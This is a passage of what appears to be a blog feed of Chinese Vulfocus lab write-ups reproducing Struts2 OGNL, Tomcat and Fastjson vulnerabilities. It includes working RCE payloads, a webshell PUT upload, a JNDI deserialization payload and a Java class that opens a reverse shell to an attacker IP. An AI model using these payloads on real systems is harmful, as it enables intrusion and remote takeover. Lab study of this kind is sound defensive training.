<li>使用vulfocus启动环境打开url<br><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081401.png" alt="image"></li>
<li>直接使用工具获得flag<br><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081402.png" alt="image"></li>
</ol>
]]></content>
      <categories>
        <category>Vulfocus靶场练习</category>
      </categories>
      <tags>
        <tag>Struts2</tag>
      </tags>
  </entry>
  <entry>
    <title>S2-029 CVE-2016-0785复现过程</title>
    <url>/2020/08/14/Vulfocus%E9%9D%B6%E5%9C%BA/S2-029%20CVE-2016-0785%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B/</url>
    <content><![CDATA[<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>Struts2的标签库使用OGNL表达式来访问ActionContext中的对象数据。为了能够访问到ActionContext中的变量，Struts2将ActionContext设置为OGNL的上下文，并将OGNL的跟对象加入ActionContext中。<br>在Struts2中，如下的标签就调用了OGNL进行取值。</p>
<a id="more"></a>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;p&gt;parameters: &lt;s:property value&#x3D;&quot;#parameters.msg&quot; &#x2F;&gt;&lt;&#x2F;p&gt;</span><br></pre></td></tr></table></figure>

<p>Struts2会解析value中的值，并当作OGNL表达式进行执行，获取到parameters对象的msg属性。S2-029仍然是依靠OGNL进行远程代码执行。</p>
<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>Struts 2.0.0 - 2.3.24.1（不包括2.3.20.3）</p>
<h2 id="复现步骤"><a href="#复现步骤" class="headerlink" title="复现步骤"></a>复现步骤</h2><ol>
<li>使用vulfoces搭建环境<br><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081403.png" alt="image"></li>
<li>POC利用</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">(%23_memberAccess[&#39;allowPrivateAccess&#39;]&#x3D;true,%23_memberAccess[&#39;allowProtectedAccess&#39;]&#x3D;true,%23_memberAccess[&#39;excludedPackageNamePatterns&#39;]&#x3D;%23_memberAccess[&#39;acceptProperties&#39;],%23_memberAccess[&#39;excludedClasses&#39;]&#x3D;%23_memberAccess[&#39;acceptProperties&#39;],%23_memberAccess[&#39;allowPackageProtectedAccess&#39;]&#x3D;true,%23_memberAccess[&#39;allowStaticMethodAccess&#39;]&#x3D;true,@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(&#39;ls&#39;).getInputStream()))</span><br></pre></td></tr></table></figure>

<p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081404.png" alt="image"></p>
]]></content>
      <categories>
        <category>Vulfocus靶场练习</category>
      </categories>
      <tags>
        <tag>Struts2</tag>
      </tags>
  </entry>
  <entry>
    <title>S2-046 CVE-2017-5638复现过程</title>
    <url>/2020/08/14/Vulfocus%E9%9D%B6%E5%9C%BA/S2-046%20CVE-2017-5638%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B/</url>
    <content><![CDATA[<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>在使用基于Jakarta插件的文件上传功能时，有可能存在远程命令执行，导致系统被黑客入侵。恶意用户可在上传文件时通过修改HTTP请求头中的Content-Type值来触发该漏洞，进而执行系统命令。</p>
<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>Struts2.3.5 – 2.3.31    Struts2.5 – 2.5.10</p>
<a id="more"></a>
<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><ol>
<li><p>使用vulfocus启动环境<br><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081405.png" alt="image"></p>
</li>
<li><p>直接使用工具拿到flag<br><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081406.png" alt="image"></p>
</li>
</ol>
]]></content>
      <categories>
        <category>Vulfocus靶场练习</category>
      </categories>
      <tags>
        <tag>Struts2</tag>
      </tags>
  </entry>
  <entry>
    <title>S2-048 CVE-2017-9791复现过程</title>
    <url>/2020/08/14/Vulfocus%E9%9D%B6%E5%9C%BA/S2-048%20CVE-2017-9791%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B/</url>
    <content><![CDATA[<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>Apache Struts 1插件的Apache Struts 2.3.X版本中存在远程代码执行漏洞,该漏洞出现于Struts2的某个类中，该类是为了将Struts1中的Action包装成为Struts2中的Action，以保证Struts2的兼容性。在Struts2中的Struts1插件启用的情况下，远程攻击者可通过使用恶意字段值，构造特定的输入，发送到ActionMessage类中，从而导致任意命令执行，进而获取目标主机系统权限</p>
<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>Apache Struts 2.3.x系列中启用了struts2-struts1-plugin插件的版本</p>
<a id="more"></a>
<h2 id="复现步骤"><a href="#复现步骤" class="headerlink" title="复现步骤"></a>复现步骤</h2><ol>
<li><p>使用vulfocus启动漏洞环境，选择Integration中的Struts 1 Integration<br><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081407.png" alt="image"></p>
</li>
<li><p>随意输入内容，使用burp抓取“submit”的数据包</p>
</li>
<li><p>poc利用</p>
</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">%&#123;(#_&#x3D;&#39;multipart&#x2F;form-data&#39;).(#dm&#x3D;@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess&#x3D;#dm):((#container&#x3D;#context[&#39;com.opensymphony.xwork2.ActionContext.container&#39;]).(#ognlUtil&#x3D;#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd&#x3D;&#39;id&#39;).(#iswin&#x3D;(@java.lang.System@getProperty(&#39;os.name&#39;).toLowerCase().contains(&#39;win&#39;))).(#cmds&#x3D;(#iswin?&#123;&#39;cmd.exe&#39;,&#39;&#x2F;c&#39;,#cmd&#125;:&#123;&#39;&#x2F;bin&#x2F;bash&#39;,&#39;-c&#39;,#cmd&#125;)).(#p&#x3D;new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process&#x3D;#p.start()).(#ros&#x3D;(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())&#125;</span><br></pre></td></tr></table></figure>

<p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081408.png" alt="image"></p>
<p>或直接使用工具<br><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081409.png" alt="image"></p>
]]></content>
      <categories>
        <category>Vulfocus靶场练习</category>
      </categories>
      <tags>
        <tag>Struts2</tag>
      </tags>
  </entry>
  <entry>
    <title>S2-052 CVE-2017-9805复现过程</title>
    <url>/2020/08/14/Vulfocus%E9%9D%B6%E5%9C%BA/S2-052%20CVE-2017-9805%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B/</url>
    <content><![CDATA[<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>Struts2 REST插件的XStream组件存在反序列化漏洞，使用XStream组件对XML格式的数据包进行反序列化操作时，未对数据内容进行有效验证，可被远程攻击。</p>
<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>Struts 2.1.2 - Struts 2.3.33<br>Struts 2.5 - Struts 2.5.12</p>
<a id="more"></a>
<h2 id="复现步骤"><a href="#复现步骤" class="headerlink" title="复现步骤"></a>复现步骤</h2><ol>
<li><p>使用vulfocus搭建漏洞环境<br><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081410.png" alt="image"></p>
</li>
<li><p>使用工具拿到flag<br><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081411.png" alt="image"></p>
</li>
</ol>
]]></content>
      <categories>
        <category>Vulfocus靶场练习</category>
      </categories>
      <tags>
        <tag>Struts2</tag>
      </tags>
  </entry>
  <entry>
    <title>S2-053 CVE-2017-12611复现过程</title>
    <url>/2020/08/14/Vulfocus%E9%9D%B6%E5%9C%BA/S2-053%20CVE-2017-12611%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B/</url>
    <content><![CDATA[<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>Struts2在使用Freemarker模板引擎的时候，同时允许解析OGNL表达式。导致用户输入的数据本身不会被OGNL解析，但由于被Freemarker解析一次后变成离开一个表达式，被OGNL解析第二次，导致任意命令执行漏洞。</p>
<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>Struts 2.0.1-2.3.33<br>Struts 2.5-2.5.10</p>
<a id="more"></a>
<h2 id="复现步骤"><a href="#复现步骤" class="headerlink" title="复现步骤"></a>复现步骤</h2><ol>
<li>使用vulfocus搭建漏洞环境<br><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081412.png" alt="image"></li>
<li>利用POC</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">name&#x3D;%&#123;(#dm&#x3D;@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess&#x3D;#dm):((#container&#x3D;#context[&#39;com.opensymphony.xwork2.ActionContext.container&#39;]).(#ognlUtil&#x3D;#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#context.setMemberAccess(#dm)))).(#cmds&#x3D;(&#123;&#39;&#x2F;bin&#x2F;bash&#39;,&#39;-c&#39;,&#39;id&#39;&#125;)).(#p&#x3D;new java.lang.ProcessBuilder(#cmds)).(#process&#x3D;#p.start()).(@org.apache.commons.io.IOUtils@toString(#process.getInputStream()))&#125;</span><br></pre></td></tr></table></figure>

<ol start="3">
<li>burp抓包构造payload<br><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081413.png" alt="image"></li>
</ol>
]]></content>
      <categories>
        <category>Vulfocus靶场练习</category>
      </categories>
      <tags>
        <tag>Struts2</tag>
      </tags>
  </entry>
  <entry>
    <title>S2-057 CVE-2018-11776复现过程</title>
    <url>/2020/08/14/Vulfocus%E9%9D%B6%E5%9C%BA/S2-057%20CVE-2018-11776%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B/</url>
    <content><![CDATA[<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>alwaysSelectFullNamespace为true。<br>action元素没有设置namespace属性，或者使用了通配符。<br>命名空间将由用户从url传递并解析为OGNL表达式，最终导致远程代码执行漏洞</p>
<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>Struts 2.3–2.3.34<br>Struts2.5–2.5.16</p>
<a id="more"></a>
<h2 id="复现步骤"><a href="#复现步骤" class="headerlink" title="复现步骤"></a>复现步骤</h2><ol>
<li><p>使用vulfocus搭建漏洞环境<br><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081414.png" alt="image"></p>
</li>
<li><p>poc利用</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;index&#x2F;%24%7B%28%23dm%3D%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS%29.%28%23ct%3D%23request%5B%27struts.valueStack%27%5D.context%29.%28%23cr%3D%23ct%5B%27com.opensymphony.xwork2.ActionContext.container%27%5D%29.%28%23ou%3D%23cr.getInstance%28%40com.opensymphony.xwork2.ognl.OgnlUtil%40class%29%29.%28%23ou.getExcludedPackageNames%28%29.clear%28%29%29.%28%23ou.getExcludedClasses%28%29.clear%28%29%29.%28%23ct.setMemberAccess%28%23dm%29%29.%28%23a%3D%40java.lang.Runtime%40getRuntime%28%29.exec%28%27id%27%29%29.%28%40org.apache.commons.io.IOUtils%40toString%28%23a.getInputStream%28%29%29%29%7D&#x2F;actionChain1.action</span><br></pre></td></tr></table></figure>
<p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081415.png" alt="image"></p>
</li>
</ol>
]]></content>
      <categories>
        <category>Vulfocus靶场练习</category>
      </categories>
      <tags>
        <tag>Struts2</tag>
      </tags>
  </entry>
  <entry>
    <title>S2-059 CVE-2019-0230复现过程</title>
    <url>/2020/08/14/Vulfocus%E9%9D%B6%E5%9C%BA/S2-059%20CVE-2019-0230%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B/</url>
    <content><![CDATA[<h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>Apache Struts于2020年8月13日披露 S2-059 Struts 远程代码执行漏洞（CVE-2019-0230），在使用某些tag等情况下可能存在OGNL表达式注入漏洞，从而造成远程代码执行，风险极大。腾讯安全专家提醒Apache Struts用户尽快升级到2.5.22或以上版本，避免遭遇黑客攻击。    </p>
<p>Apache Struts2框架是一个用于开发Java EE网络应用程序的Web框架，应用十分广泛。</p>
<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>Apache Struts 2.0.0 - 2.5.20</p>
<a id="more"></a>
<h2 id="复现步骤"><a href="#复现步骤" class="headerlink" title="复现步骤"></a>复现步骤</h2><ol>
<li><p>使用vulfocus搭建漏洞环境<br><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081416.png" alt="image"></p>
</li>
<li><p>POC利用：</p>
</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">%25&#123;%23_memberAccess.allowPrivateAccess%3dtrue,%23_memberAccess.allowStaticMethodAccess%3dtrue,%23_memberAccess.excludedClasses%3d%23_memberAccess.acceptProperties,%23_memberAccess.excludedPackageNamePatterns%3d%23_memberAccess.acceptProperties,%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse().getWriter(),%23a%3d%40java.lang.Runtime%40getRuntime(),%23s%3dnew+java.util.Scanner(%23a.exec(&#39;ls&#39;).getInputStream()).useDelimiter(&#39;\\\\A&#39;),%23str%3d%23s.hasNext()%3f%23s.next()%3a&#39;&#39;,%23res.print(%23str),%23res.close()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081417.png" alt="image"></p>
]]></content>
      <categories>
        <category>Vulfocus靶场练习</category>
      </categories>
      <tags>
        <tag>Struts2</tag>
      </tags>
  </entry>
  <entry>
    <title>S2-devMode CVE-2016-4438复现过程</title>
    <url>/2020/08/14/Vulfocus%E9%9D%B6%E5%9C%BA/S2-devMode%20CVE-2016-4438%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B/</url>
    <content><![CDATA[<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>当Struts2开启devMode模式时，将导致严重远程代码执行漏洞。如果WebService 启动权限为最高权限时，可远程执行任意命令，包括关机、建立新用户、以及删除服务器上所有文件等等。</p>
<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>当Struts开启devMode时，该漏洞将影响Struts 2.1.0–2.5.1，通杀Struts2所有版本。</p>
<a id="more"></a>
<h2 id="复现步骤"><a href="#复现步骤" class="headerlink" title="复现步骤"></a>复现步骤</h2><ol>
<li><p>使用vulfocus搭建漏洞环境<br><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081418.png" alt="image"></p>
</li>
<li><p>直接使用工具获得flag<br><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081419.png" alt="image"></p>
</li>
</ol>
]]></content>
      <categories>
        <category>Vulfocus靶场练习</category>
      </categories>
      <tags>
        <tag>Struts2</tag>
      </tags>
  </entry>
  <entry>
    <title>Tomcat-弱口令-getshell复现过程</title>
    <url>/2020/08/12/Vulfocus%E9%9D%B6%E5%9C%BA/Tomcat-%E5%BC%B1%E5%8F%A3%E4%BB%A4-getshell%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B/</url>
    <content><![CDATA[<h2 id="漏洞概述"><a href="#漏洞概述" class="headerlink" title="漏洞概述"></a>漏洞概述</h2><p>Apache+Tomcat 是很常用的网站解决方案，Apache 用于提供 web 服务，而 Tomcat 是 Apache 服务器的扩展，用于运行 jsp 页面和 servlet。Tomcat 有一个管理后台，其用户名和密码在 Tomcat 安装目录下的 conf\tomcat-users.xml 文件中配置，不少管理员为了方便，经常采用弱口令。 Tomcat 支持在后台部署 war 包，可以直接将 webshell 部署到 web 目录下，如果 tomcat 后台管理用户存在弱口令，这很容易被利用上传 webshell。</p>
<h2 id="知识点：什么是war包"><a href="#知识点：什么是war包" class="headerlink" title="知识点：什么是war包"></a>知识点：什么是war包</h2><p>war 包是一种打包格式<br>Java web工程，都是打成war包，进行发布，打成war包的好处是不会缺少目录，并且只管理好一个发布文件就好，并且tomcat服务器能够自动识别，将war包放在tomcat容器的webapps下，启动服务，即可运行该项目，该war包会自动解压出一个同名的文件夹。<br>war 包的结构（是一个web 项目编译后的结果）</p>
<a id="more"></a>
<h2 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h2><ol>
<li><p>使用vulfocus启动漏洞环境<br> <img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081201.png" alt="image"></p>
</li>
<li><p>访问漏洞环境，点击“Manager App”<br> <img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081202.png" alt="image"></p>
</li>
<li><p>弱口令登录，账号tomcat，密码tomcat</p>
<p> <img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081203.png" alt="image"></p>
</li>
<li><p>把jsp木马解压为zip压缩文件，改后缀名为war</p>
</li>
<li><p>上传war包<br> <img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081204.png" alt="image"></p>
</li>
<li><p>部署war包之后，war包会在当前路径下解压。<br> <img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081205.png" alt="image"></p>
</li>
<li><p>访问路径是 /war (war包路径) /XXX.jsp（你的 webshell），拿到flag<br> <img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081206.png" alt="image"></p>
</li>
</ol>
]]></content>
      <categories>
        <category>Vulfocus靶场练习</category>
      </categories>
      <tags>
        <tag>Tomcat</tag>
      </tags>
  </entry>
  <entry>
    <title>Tomcat 任意写入文件漏洞复现过程（CVE-2017-12615）</title>
    <url>/2020/08/11/Vulfocus%E9%9D%B6%E5%9C%BA/Tomcat%20%E4%BB%BB%E6%84%8F%E5%86%99%E5%85%A5%E6%96%87%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B%EF%BC%88CVE-2017-12615%EF%BC%89/</url>
    <content><![CDATA[<h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>Apache Tomcat 7.0.0到7.0.79版本中存在远程代码执行漏洞，当 Tomcat 运行在 Windows 主机上，且启用了 HTTP PUT 请求方法时，攻击者可通过精心构造的攻击请求向服务器上传包含任意代码的 JSP 文件，文件中的代码被服务器执行。</p>
<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>Apache Tomcat &gt;=7.0.0，&lt;=7.0.79</p>
<a id="more"></a>
<h2 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h2><ol>
<li><p>使用vulfocus启动漏洞环境<br> <img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081101.png" alt="image"></p>
</li>
<li><p>访问页面如下：<br> <img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081102.png" alt="image"></p>
</li>
<li><p>直接抓包，修改请求方式为 PUT，并且设置文件名为1.jsp(名字随意)，然后填充 shell(jsp shell即可)文件内容，发送成功后，服务器返回状态码201。我这里直接上传大马<br><img src="14C523405179468B8FB07461BF2ACA55" alt="image"></p>
</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">PUT &#x2F;1.jsp&#x2F; HTTP&#x2F;1.1</span><br><span class="line">Host: ip</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64; rv:76.0) Gecko&#x2F;20100101 Firefox&#x2F;76.0</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,*&#x2F;*;q&#x3D;0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">DNT: 1</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Cache-Control: max-age&#x3D;0</span><br><span class="line">Content-Length: 60577</span><br><span class="line"></span><br><span class="line">shell</span><br></pre></td></tr></table></figure>

<ol start="4">
<li>直接访问上传的木马文件，拿到flag<br><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081103.png" alt="image"></li>
</ol>
]]></content>
      <categories>
        <category>Vulfocus靶场练习</category>
      </categories>
      <tags>
        <tag>Tomcat</tag>
      </tags>
  </entry>
  <entry>
    <title>Fastjson_1.2.24反序列化漏洞复现过程</title>
    <url>/2020/08/08/Vulfocus%E9%9D%B6%E5%9C%BA/Fastjson_1.2.24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B/</url>
    <content><![CDATA[<h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>FastJson 库是 Java 的一个 Json 库，其作用是将 Java 对象转换成 json 数据来表示，也可以将 json 数据转换成 Java 对象，使用非常方便，号称是执行速度最快的库。</p>
<p>在 1.2.24 版本的 Fastjson 出现了一个反序列化的漏洞，fastjson 在解析 json 的过程中，支持使用 autoType 来实例化某一个具体的类，并调用该类的 set/get 方法来访问属性。通过查找代码中相关的方法，即可构造出一些恶意利用链。</p>
<h2 id="漏洞影响版本"><a href="#漏洞影响版本" class="headerlink" title="漏洞影响版本"></a>漏洞影响版本</h2><p>fastjson &lt;= 1.2.47</p>
<a id="more"></a>
<h2 id="漏洞复现过程"><a href="#漏洞复现过程" class="headerlink" title="漏洞复现过程"></a>漏洞复现过程</h2><h3 id="漏洞环境搭建"><a href="#漏洞环境搭建" class="headerlink" title="漏洞环境搭建"></a>漏洞环境搭建</h3><ol>
<li>搭建vulfocus漏洞环境</li>
<li>启动“vulfocus/fastjson-cnvd_2017_02833”</li>
</ol>
<p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020080801.png" alt="image"><br>3. 访问页面显示如下说明环境正常<br><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020080802.png" alt="image"></p>
<h3 id="特征判断"><a href="#特征判断" class="headerlink" title="特征判断"></a>特征判断</h3><p>可以通过DNS回显的方式检测后端是否使用Fastjson</p>
<p>构造请求如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F; HTTP&#x2F;1.1</span><br><span class="line">Host: 192.168.3.130:59541</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: *&#x2F;*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident&#x2F;5.0)</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application&#x2F;json</span><br><span class="line">Content-Length: 44</span><br><span class="line"></span><br><span class="line">&#123;&quot;@type&quot;:&quot;java.net.Inet4Address&quot;,&quot;val&quot;:&quot;dnslog&quot;&#125;</span><br></pre></td></tr></table></figure>
<p>其他回显方式：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&quot;@type&quot;:&quot;java.net.Inet4Address&quot;,&quot;val&quot;:&quot;dnslog&quot;&#125;</span><br><span class="line">&#123;&quot;@type&quot;:&quot;java.net.Inet6Address&quot;,&quot;val&quot;:&quot;dnslog&quot;&#125;</span><br><span class="line">&#123;&quot;@type&quot;:&quot;java.net.InetSocketAddress&quot;&#123;&quot;address&quot;:,&quot;val&quot;:&quot;dnslog&quot;&#125;&#125;</span><br><span class="line">&#123;&quot;@type&quot;:&quot;com.alibaba.fastjson.JSONObject&quot;, &#123;&quot;@type&quot;: &quot;java.net.URL&quot;, &quot;val&quot;:&quot;dnslog&quot;&#125;&#125;&quot;&quot;&#125;</span><br><span class="line">&#123;&#123;&quot;@type&quot;:&quot;java.net.URL&quot;,&quot;val&quot;:&quot;dnslog&quot;&#125;:&quot;aaa&quot;&#125;</span><br><span class="line">Set[&#123;&quot;@type&quot;:&quot;java.net.URL&quot;,&quot;val&quot;:&quot;dnslog&quot;&#125;]</span><br><span class="line">Set[&#123;&quot;@type&quot;:&quot;java.net.URL&quot;,&quot;val&quot;:&quot;dnslog&quot;&#125;</span><br><span class="line">&#123;&#123;&quot;@type&quot;:&quot;java.net.URL&quot;,&quot;val&quot;:&quot;dnslog&quot;&#125;:0</span><br></pre></td></tr></table></figure>
<p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020080803.png" alt="image"></p>
<h3 id="fastjson1-2-47以下版本通杀poc："><a href="#fastjson1-2-47以下版本通杀poc：" class="headerlink" title="fastjson1.2.47以下版本通杀poc："></a>fastjson1.2.47以下版本通杀poc：</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;name&quot;:&#123;</span><br><span class="line">        &quot;@type&quot;:&quot;java.lang.Class&quot;,</span><br><span class="line">        &quot;val&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><br><span class="line">        &#125;,</span><br><span class="line">        &quot;f&quot;:&#123;</span><br><span class="line">        &quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;, &quot;dataSourceName&quot;:&quot;ldap:&#x2F;&#x2F;asdfasfd&#x2F;&quot;,</span><br><span class="line">        &quot;autoCommit&quot;:true</span><br><span class="line">    &#125;</span><br><span class="line">&#125;,</span><br><span class="line">age:11</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>其中{“@type”:”com.sun.rowset.JdbcRowSetImpl”, “dataSourceName”:”ldap://asdfasfd/“, “autoCommit”:true}也可以替换成其他利用链</p>
</blockquote>
<h3 id="攻击机环境配置"><a href="#攻击机环境配置" class="headerlink" title="攻击机环境配置"></a>攻击机环境配置</h3><h4 id="centos7服务器，可通外网"><a href="#centos7服务器，可通外网" class="headerlink" title="centos7服务器，可通外网"></a>centos7服务器，可通外网</h4><ol>
<li><p>修改 java 恶意类代码保存为 TouchFile.java</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import java.lang.Runtime;</span><br><span class="line">import java.lang.Process;</span><br><span class="line"></span><br><span class="line">public class TouchFile &#123;</span><br><span class="line">   static &#123;</span><br><span class="line">       try &#123;</span><br><span class="line">          Runtime r &#x3D; Runtime.getRuntime();</span><br><span class="line">          Process p &#x3D; r.exec(new String[]&#123;&quot;&#x2F;bin&#x2F;bash&quot;,&quot;-c&quot;,&quot;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;IP&#x2F;1888 0&gt;&amp;1&quot;&#125;);</span><br><span class="line">          p.waitFor();</span><br><span class="line">       &#125; catch (Exception e) &#123;</span><br><span class="line">           &#x2F;&#x2F; do nothing</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p> 将恶意java代码上传到攻击机，并使用javac编译（需安装jdk1.8并配置环境变量）<br> <img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020080804.png" alt="image"></p>
</li>
<li><p>使用 python -m SimpleHTTPServer 快速搭建http服务<br> <img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020080805.png" alt="image"><br> 访问ip+1111端口号，证明http服务搭建正确<br> <img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020080806.png" alt="image"><br> 服务器收到响应<br> <img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020080807.png" alt="image"></p>
</li>
<li><p>开启ldap服务</p>
<ul>
<li><p>使用git下载<strong>marshalsec</strong>，mvn编译<strong>marshalsec</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;mbechler&#x2F;marshalsec.git</span><br><span class="line">cd marshalsec&#x2F;</span><br><span class="line">mvn clean package -DskipTests</span><br></pre></td></tr></table></figure></li>
<li><p>使用<strong>marshalsec</strong>开启ldap服务</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http:&#x2F;&#x2F;ip:1111&#x2F;#TouchFile 9999</span><br></pre></td></tr></table></figure>

<p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020080808.png" alt="image"></p>
</li>
<li><p>nc监听1888端口</p>
<p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020080809.png" alt="image"></p>
</li>
</ul>
</li>
<li><p>构造payload发送请求</p>
</li>
</ol>
